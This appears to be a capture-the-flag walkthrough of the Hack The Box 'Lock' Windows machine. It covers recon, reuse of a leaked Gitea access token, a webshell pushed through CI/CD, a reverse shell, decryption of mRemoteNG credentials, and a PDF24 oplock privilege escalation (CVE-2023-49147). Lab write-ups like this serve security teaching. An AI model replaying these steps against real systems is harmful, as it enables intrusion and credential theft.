---
layout: post
title: "[HTB] Lock"
description: "[Machine] - Easy difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Easy
---

![](/img/htb_img/Lock_img/img1.png)

- OS: Windows
- Release Date: 21 Aug 2025
- Difficulty: Easy

<br>

# Enumeration
I always begin with a full TCP sweep to catch anything unusual, then follow up with service detection on the discovered ports:
## Nmap recon
```
‚ùØ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 00:28 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.093s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

Scripts and versions.
```
‚ùØ nmap -p80,445,3000,3389 -sCV -Pn -oN targeted $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-09 00:29 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.093s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Lock - Index
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds?
3000/tcp open  http          Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=132d9ae1f9b06e91; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=IargsRuky0tWVmr2tmhGfVQh1aA6MTc1OTkzNzg5NzQ1MDk0NjUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 08 Oct 2025 15:38:18 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=f5c27f24abeaee63; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=LPRyr2unwaLn5YY6fIx9Bvl4ncc6MTc1OTkzNzg5ODgyMTA4MzUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Wed, 08 Oct 2025 15:38:18 GMT
|_    Content-Length: 0
|_http-title: Gitea: Git with a cup of tea
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-10-08T15:39:28+00:00; -6h51m16s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-10-07T15:07:39
|_Not valid after:  2026-04-08T15:07:39
| rdp-ntlm-info: 
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-10-08T15:38:44+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=10/9%Time=68E6E5D5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,1000,"HTTP/1\.0\x20200\x20OK\r\nCache-Control:
SF:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nConte
SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_gitea=
SF:132d9ae1f9b06e91;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie
SF::\x20_csrf=IargsRuky0tWVmr2tmhGfVQh1aA6MTc1OTkzNzg5NzQ1MDk0NjUwMA;\x20P
SF:ath=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Option
SF:s:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2008\x20Oct\x202025\x2015:38:18\x20G
SF:MT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"theme-
SF:auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=device
SF:-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20c
SF:up\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:app
SF:lication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYS
SF:IsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfd
SF:XJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8v
SF:bG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmc
SF:iLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCon
SF:tent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\
SF:r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20Metho
SF:d\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Control
SF::\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nSet-
SF:Cookie:\x20i_like_gitea=f5c27f24abeaee63;\x20Path=/;\x20HttpOnly;\x20Sa
SF:meSite=Lax\r\nSet-Cookie:\x20_csrf=LPRyr2unwaLn5YY6fIx9Bvl4ncc6MTc1OTkz
SF:Nzg5ODgyMTA4MzUwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSi
SF:te=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2008\x20Oct\
SF:x202025\x2015:38:18\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequ
SF:est,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pla
SF:in;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reque
SF:st");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-10-08T15:38:46
|_  start_date: N/A
|_clock-skew: mean: -6h51m19s, deviation: 2s, median: -6h51m21s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.50 seconds
```

**Findings:**
- 80/tcp ‚Äì IIS 10.0 (ASP.NET website)
- 3000/tcp ‚Äì HTTP that smells like Gitea (cookies + title)
- 445/tcp ‚Äì SMB
- 3389/tcp ‚Äì RDP (hostname reported as `LOCK`, standalone server)
The TTL values are consistent with a Windows host one hop away. With web + RDP + SMB open, the attack surface looks promising.

## TCP 80: HTTP IIS
![](/img/htb_img/Lock_img/img2.png)

The landing page is a static corporate site for ‚Äúdocument editing services‚Äù. All links are anchor-jumps on a single page: no subpages, no forms. I ran content discovery just in case:
```bash
‚ùØ feroxbuster -u http://$target -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x aspx,asp,config,txt -n --dont-extract-links
                                                                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher ü§ì                 ver: 2.11.0
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üéØ  Target Url            ‚îÇ http://10.129.xx.xx
 üöÄ  Threads               ‚îÇ 50
 üìñ  Wordlist              ‚îÇ /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 üëå  Status Codes          ‚îÇ All Status Codes!
 üí•  Timeout (secs)        ‚îÇ 7
 ü¶°  User-Agent            ‚îÇ feroxbuster/2.11.0
 üíâ  Config File           ‚îÇ /etc/feroxbuster/ferox-config.toml
 üí≤  Extensions            ‚îÇ [aspx, asp, config, txt]
 üèÅ  HTTP methods          ‚îÇ [GET]
 üö´  Do Not Recurse        ‚îÇ true
 üéâ  New Version Available ‚îÇ https://github.com/epi052/feroxbuster/releases/latest
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 üèÅ  Press [ENTER] to use the Scan Management Menu‚Ñ¢
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       42l      157w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        3l        7w       46c http://10.129.xx.xx/CHANGELOG.txt
200      GET      347l     1183w    16054c http://10.129.xx.xx/
200      GET      347l     1183w    16054c http://10.129.xx.xx/index.html
500      GET       29l       89w     1208c http://10.129.xx.xx/.git
200      GET      347l     1183w    16054c http://10.129.xx.xx/Index.html
200      GET        3l        7w       46c http://10.129.xx.xx/changelog.txt
```
No actionable endpoints or upload points turned up. 

```
‚ùØ curl $target -I
HTTP/1.1 200 OK
Content-Length: 16054
Content-Type: text/html
Last-Modified: Thu, 28 Dec 2023 14:07:59 GMT
Accept-Ranges: bytes
ETag: "675cb2439739da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Wed, 08 Oct 2025 15:50:32 GMT
```

However, the HTTP response headers include `X-Powered-By: ASP.NET`, which will matter later (ASPX webshell compatibility).
Nothing of interest over here.

## TCP 3000: Gitea
![](/img/htb_img/Lock_img/img3.png)
Browsing to port 3000 presents a **Gitea** instance. 
![](/img/htb_img/Lock_img/img4.png)
Under _Explore_, there‚Äôs one small public repo with a tiny Python script that queries the Gitea API. 

![](/img/htb_img/Lock_img/img5.png)

The interesting part isn‚Äôt the script itself but the **commit history**: an early commit used a **hardcoded Personal Access Token**, later replaced with `os.getenv("GITEA_ACCESS_TOKEN")`.
Even though the current file is sanitized, the commit diff still reveals the **old token**. That‚Äôs our entry ticket.
Token: `43ce39bb0bd6bc489284f2905f033ca467a6362f`.

## Using the leaked token
I used the script `repos.py`, because it allows to see all the repos of an IP:
```
‚ùØ export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f
‚ùØ python repos.py http://$target:3000
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```
From there, listing repos showed a **private repo** named `website` owned by `ellen.freeman`. 

Pulling `readme.md` confirms **CI/CD is active** - pushes to `main` automatically redeploy the production site on port 80.
Cloning with a token-in-URL is the simplest path:
```bash
‚ùØ git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@$target:3000/ellen.freeman/website.git
Cloning into 'website'...
remote: Enumerating objects: 165, done.
remote: Counting objects: 100% (165/165), done.
remote: Compressing objects: 100% (128/128), done.
remote: Total 165 (delta 35), reused 153 (delta 31), pack-reused 0
Receiving objects: 100% (165/165), 7.16 MiB | 1.90 MiB/s, done.
Resolving deltas: 100% (35/35), done.
‚ùØ cd website
‚ùØ ls
ÔÉá assets  ÔÖú changelog.txt  ÔÑª index.html  Óòâ readme.md

‚ùØ cat readme.md
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
       ‚îÇ File: readme.md
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
   1   ‚îÇ # New Project Website
   2   ‚îÇ 
   3   ‚îÇ CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
```
Repo contents look like a typical static site: `index.html`, `assets/`, `changelog.txt`, `readme.md`.

<br>

# Foothold
Because the website is ASP.NET, I added a minimal **ASPX webshell** to the repo and pushed it to `main`:
```bash
‚ùØ git add webshell.aspx
‚ùØ git config user.name "ellen.freeman"
‚ùØ git config user.email "ellen.freeman@lock.htb"
‚ùØ git commit -m "hehe"
[main 0aa4f74] hehe
 1 file changed, 2156 insertions(+)
 create mode 100644 webshell.aspx
‚ùØ git push
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 6 threads
Compressing objects: 100% (3/3), done.
Writing objects: 100% (3/3), 40.23 KiB | 10.06 MiB/s, done.
Total 3 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
remote: . Processing 1 references
remote: Processed 1 references in total
To http://10.129.xx.xx:3000/ellen.freeman/website.git
   73cdcc1..0aa4f74  main -> main
```

## Revshell as ellen.freeman
Within seconds the file appears under the web root on **port 80**. 

![](/img/htb_img/Lock_img/img6.png)

Opening the webshell gives a command box. I generated a quick PowerShell reverse shell (base64-encoded) and pasted it into the webshell to call back to my listener:
```bash
‚ùØ rlwrap -cAr nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 60457

PS C:\inetpub\wwwroot> whoami
lock\ellen.freeman
PS C:\inetpub\wwwroot> 
```

**Foothold:** `whoami` returns `lock\ellen.freeman`.
Why this works: the repo is wired to production through CI/CD. By adding a server-side executable page (ASPX), the build deploys it straight into IIS, giving us code execution through the web interface.

<br>

# Lateral movement 
## mRemoteNG loot: RDP
With a shell as `ellen.freeman`, I enumerated user profiles:
```powershell
PS C:\inetpub\wwwroot> Get-ChildItem C:\Users


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----        12/27/2023   2:00 PM                .NET v4.5                                                            
d-----        12/27/2023   2:00 PM                .NET v4.5 Classic                                                    
d-----        12/27/2023  12:01 PM                Administrator                                                        
d-----        12/28/2023  11:36 AM                ellen.freeman                                                        
d-----        12/28/2023   6:14 AM                gale.dekarios                                                        
d-r---        12/27/2023  10:21 AM                Public
```

A second non-admin profile `gale.dekarios` exists. In `C:\Users\ellen.freeman\Documents` there‚Äôs a `config.xml` that clearly belongs to **mRemoteNG** - the all-in-one remote connections manager.

```
PS C:\Users\ellen.freeman\Documents> type config.xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
PS C:\Users\ellen.freeman\Documents>
```

mRemoteNG stores connection entries in XML with **encrypted** passwords (AES-GCM). Decryption does **not** require the master password if you have the file because the key derivation parameters and protected blob are embedded.

Grab the file and decrypt locally with a public tool:
```bash
# copy config.xml off the box
‚ùØ python3 /opt/mremoteng-decrypt/mremoteng_decrypt.py -rf config.xml
Username: Gale.Dekarios
Hostname: Lock
Password: ty8wnW9qCKDosXo6 
```
**Result:** credentials for `Gale.Dekarios` over **RDP** to host `Lock`.

I like to use `xfreerdp3`:
```
‚ùØ xfreerdp3 /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:$target:3389 +clipboard
```
![](/img/htb_img/Lock_img/img7.png)

If you would like to use a GUI, you can try `Remmina`.

### User flag
The user flag is in the desktop.
```
<REDACTED>
```

<br>

# Privilege escalation
On Gale‚Äôs desktop I noticed shortcuts for **mRemoteNG** and **PDF24 Creator**. In `C:\Program Files\PDF24`, `pdf24.exe` reports **version 11.15.1**.

## CVE-2023-49147
A changelog entry for the next release mentions fixing a bug where the **MSI repair** path reveals a visible `cmd.exe` window while performing printer install tasks as **SYSTEM**. The vulnerable repair flow spins up `pdf24-PrinterInstall.exe`, which writes to `C:\Program Files\PDF24\faxPrnInst.log`. If we take an **opportunistic lock (oplock)** on that logfile, the installer will stall, leaving the **SYSTEM**-owned console window interactive long enough to pivot into a real SYSTEM shell.

I will be using SetOpLock from the Google Project Zero: [SetOpLock](https://github.com/googleprojectzero/symboliclink-testing-tools/releases)
### Steps
1. **Place an oplock** on the target log file using Project Zero‚Äôs `SetOpLock.exe` and open the program:
```powershell
.\SetOpLock.exe "C:\\Program Files\\PDF24\\faxPrnInst.log" r
```
    The `r` mode holds the file open for read, blocking writers.

![](/img/htb_img/Lock_img/img8.png)

![](/img/htb_img/Lock_img/img9.png)

Next -> Repair -> Repair

2. **Abuse the hanging console**. Near the end of the repair, an elevated `cmd.exe`-hosted window for `pdf24-PrinterInstall.exe` appears and **hangs** because of our oplock. Right‚Äëclick its title bar ‚Üí **Properties** ‚Üí click the **‚Äúlegacy console mode‚Äù** link. When prompted how to open the link, choose a browser like **Firefox** (also running as SYSTEM via the same process token).

![](/img/htb_img/Lock_img/img10.png)
![](/img/htb_img/Lock_img/img11.png)

2. **Spawn SYSTEM cmd**. In Firefox, press **Ctrl+O** to open a file, and in the location box type `cmd.exe`. Hitting Enter launches a **SYSTEM** command prompt. From there:
```
Microsoft Windows [Version 10.0.20348.3932]                                        (c) Microsoft Corporation. All rights reserved.
C:\Windows\System32>whoami                                                         nt authority\system
C:\Windows\System32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
<REDACTED>

C:\Users\Administrator\Desktop>  
```

**Why this works:** the MSI repair is a SYSTEM task. By blocking the printer installer‚Äôs log file, we force the transient console to remain visible/interactive. The ‚Äúlegacy console‚Äù hyperlink hands control to a SYSTEM-owned process capable of launching arbitrary programs.


---
---